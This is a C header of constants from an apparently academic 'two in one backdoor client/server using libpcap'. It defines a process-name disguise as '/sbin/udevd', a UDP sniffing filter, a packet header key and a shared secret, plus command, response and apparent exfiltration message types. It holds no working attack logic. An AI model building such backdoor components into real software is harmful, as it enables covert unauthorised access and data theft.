#ifndef DEFS_H
#define DEFS_H

/*
SOURCE FILE: defs.h

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: This file holds the constants used throughout the program.
*/

#include <sys/types.h>

// Sized types
#define uint8   u_int8_t
#define uint16  u_int16_t
#define uint32  u_int32_t
#define uint64  u_int64_t

#define TRUE    1
#define FALSE   0

#define MASK 	"/sbin/udevd"

#define ETHER_IP_UDP_LEN 44
#define IP_UDP_LEN 28
#define LOCALHOST 0x0100007F

#define MAX_LEN    4096
#define SLEEP_TIME 100000

#define DEF_PRT 9001
#define DEF_ADR "127.0.0.1"
#define DEF_FLT "udp port 9001"
#define DEF_WCH "/mnt/"

#define SIGNTR  0x20
#define HDR_KEY "(P^.^)=P"
#define SEKRET  "Don't panic"

#define FRAM_SZ 8
#define MD5_LEN 4
#define CMD_TYP 0x00
#define RSP_TYP 0x01
#define XFL_TYP 0x02

#endif
